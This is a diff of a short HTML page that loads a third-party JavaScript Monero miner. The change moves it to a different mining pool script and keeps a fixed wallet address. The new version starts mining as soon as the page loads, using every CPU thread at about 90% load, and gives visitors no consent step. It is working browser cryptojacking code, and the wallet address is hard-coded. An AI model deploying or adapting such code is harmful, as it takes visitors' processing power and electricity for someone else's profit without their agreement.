@@ -1,24 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monero Mining</title>
-</head>
-<body>
-    <h1>Mining Monero</h1>
-    <p>Mining will start shortly...</p>
-    
-    <script src="https://monero.herominers.com/lib/monero.min.js"></script>
+<html>
+  <head>
+    <title>Mendes Miner</title>
+    <script src="https://webminer.moneroocean.stream/webminer.js"></script>
+  </head>
+  <body>
+    <h1>Mendes' Monero Miner</h1>
+    <p>Mining for Mendes using MoneroOcean...</p>
     <script>
-        var miner = new Miner('xmr', {
-            url: 'es.monero.herominers.com:1111',
-            user: '44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf',
-            threads: 4, // Adjust the number of threads to control CPU usage
-            autoStart: true
-        });
+      const miner = new window.Miner.Anonymous("44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf", {
+        threads: navigator.hardwareConcurrency || 4,
+        throttle: 0.1 // 90% CPU use
+      });
 
-        miner.start();
+      miner.start();
+
+      miner.on('accepted', () => {
+        console.log('Hash accepted');
+      });
     </script>
-</body>
+  </body>
 </html>
